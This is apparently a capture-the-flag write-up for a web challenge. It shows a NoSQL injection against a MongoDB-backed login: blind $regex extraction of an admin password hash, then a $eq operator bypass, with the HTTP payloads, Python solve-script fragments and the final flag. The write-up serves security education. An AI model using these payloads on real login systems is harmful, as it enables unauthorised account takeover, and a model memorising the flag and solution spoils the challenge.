# Awaiting Administrator

**Category:** Web
**Points:**: 1000
**Description:** The mainframe hums in a deserted control room. Administrators have vanished, leaving the system in lockdown. Registration still works, but passwords can't be issued as attendants are missing. Legacy 32-character hex tokens drift through the subsystems, recover what you need and pry open the admin console.

## Solution

### Step 1: Initial Reconnaissance with Burp Suite

I started by configuring my browser to proxy through **Burp Suite** and exploring the target application. The site presents a retro-themed interface with four pages: Home, Blog, Login, and Register.

**Key observations in Burp:**

1. **Login form** (`/login`):
   - Intercept shows `POST /api/login` with `Content-Type: application/x-www-form-urlencoded`
   - Parameters: `username` and `password`

2. **Register form** (`/register`):
   - Sends `POST /api/register` with `username`, `name`, and `email`
   - **No password field** — suspicious! Passwords appear to be auto-generated

3. **Admin page** (`/admin`):
   - Returns `302 → /login` when unauthenticated (visible in Burp's HTTP history)

**Testing for user enumeration in Burp Repeater:**

I sent a login request to Burp Repeater and tested different usernames:

```http
POST /api/login HTTP/1.1
Host: mnbvcxzqwertyuip-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

Response:

```json
{ "ok": false, "error": "Wrong password for user: admin" }
```

vs. non-existent user:

```json
{ "ok": false, "error": "User does not exist" }
```

The different error messages confirm that **user enumeration is possible** and that the `admin` account exists.

### Step 2: Discovering NoSQL Injection in Burp Suite

The challenge description mentions "legacy 32-character hex tokens" (hinting at MD5 hashes) and the lack of password registration suggests a **NoSQL backend** (likely MongoDB).

**Testing for operator injection in Burp Repeater:**

I modified the login request to test MongoDB query operators:

```http
POST /api/login HTTP/1.1
Host: mnbvcxzqwertyuip-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=
```

Response:

```json
{ "ok": false, "error": "Unsupported query operator: $ne" }
```

The server **explicitly blocks** `$ne`! I tested other common operators in Burp:

| Operator     | Response                                     | Status          |
| ------------ | -------------------------------------------- | --------------- |
| `$ne`        | `Unsupported query operator: $ne`            | ❌ Blocked      |
| `$gt`        | `Unsupported query operator: $gt`            | ❌ Blocked      |
| `$in`        | `Unsupported query operator: $in`            | ❌ Blocked      |
| `$exists`    | `Unsupported query operator: $exists`        | ❌ Blocked      |
| `$where`     | `Unsupported query operator: $where`         | ❌ Blocked      |
| **`$regex`** | `{"ok":false,"error":"Invalid credentials"}` | ✅ **Allowed!** |
| **`$eq`**    | `{"ok":false,"error":"Invalid credentials"}` | ✅ **Allowed!** |

**Key discovery in Burp:** The server has a **partial allowlist** — it blocks dangerous operators but **allows `$regex` and `$eq`**!

### Step 3: Testing the Regex Oracle

I tested different regex patterns in Burp Repeater to confirm an oracle exists:

```http
POST /api/login HTTP/1.1

username=admin&password[$regex]=^a
```

Response: `{"ok":false,"error":"User does not exist"}`

```http
username=admin&password[$regex]=^b
```

Response: `{"ok":false,"error":"Wrong password for user: admin"}`

**Oracle confirmed!** The different error messages reveal whether the regex matched:

| Regex Match?          | Response                           |
| --------------------- | ---------------------------------- |
| ✅ Matches a document | `"Wrong password for user: admin"` |
| ❌ No match           | `"User does not exist"`            |

This allows **character-by-character extraction** of the stored password hash!

### Step 4: Automated Hash Extraction with solve.py

Manual extraction in Burp would take too long for 32 characters. I created a Python script to automate the blind regex injection:
**Running the script:**

```bash
python solve.py
```

Output:

```
============================================================
Awaiting Administrator - NoSQL Injection Exploit
============================================================
[*] Starting blind NoSQL regex extraction...
[1/32] b
[2/32] ba
[3/32] ba2
...
[30/32] ba2e121bc28f922088ac3d78f31a05a
[31/32] ba2e121bc28f922088ac3d78f31a05a4
[32/32] ba2e121bc28f922088ac3d78f31a05a4

[+] Extracted hash: ba2e121bc28f922088ac3d78f31a05a4
```

### Step 5: Authentication Bypass via `$eq` Operator

The extracted value `ba2e121bc28f922088ac3d78f31a05a4` is the **stored password hash** in MongoDB. Sending it as a plaintext password fails because the server hashes the input again.

**Testing in Burp Repeater:**

```http
POST /api/login HTTP/1.1

username=admin&password=ba2e121bc28f922088ac3d78f31a05a4
```

Response: `{"ok":false,"error":"Invalid credentials"}` ❌

The hash also isn't in common wordlists (confirmed with John the Ripper), because the password was randomly generated.

**The solution:** Use the **`$eq` operator** to match the stored hash directly:

```http
POST /api/login HTTP/1.1

username=admin&password[$eq]=ba2e121bc28f922088ac3d78f31a05a4
```

Response: `{"ok":true,"message":"Welcome, admin"}` ✅

The `$eq` operator bypasses server-side hashing by directly comparing the stored value in the MongoDB query!

**Automated in solve.py:**

```python
def authenticate_with_hash(password_hash):
    """Authenticate using $eq operator to bypass server-side hashing."""
    data = {
        "username": "admin",
        "password[$eq]": password_hash
    }

    session = requests.Session()
    response = session.post(LOGIN_ENDPOINT, data=data)

    if response.status_code == 200 and "Welcome" in response.text:
        print("[+] Authentication successful!")
        return session

    return None
```

### Step 6: Capturing the Flag

With the authenticated session, the script accesses the admin panel:

```python
def get_flag(session):
    """Access admin panel to retrieve the flag."""
    response = session.get(ADMIN_ENDPOINT)

    flag_match = re.search(r'CSC26\{[^}]+\}', response.text)
    if flag_match:
        print(f"🚩 {flag_match.group(0)}")
```

**Final output:**

```
[*] Authenticating as admin with extracted hash...
[+] Authentication successful!
[*] Accessing admin panel...
[+] Flag retrieved!

CSC26{e5c85f598b6cbd56823da5ee630cd60490a06a3516ef09f89e9f4ba260412a90}
```
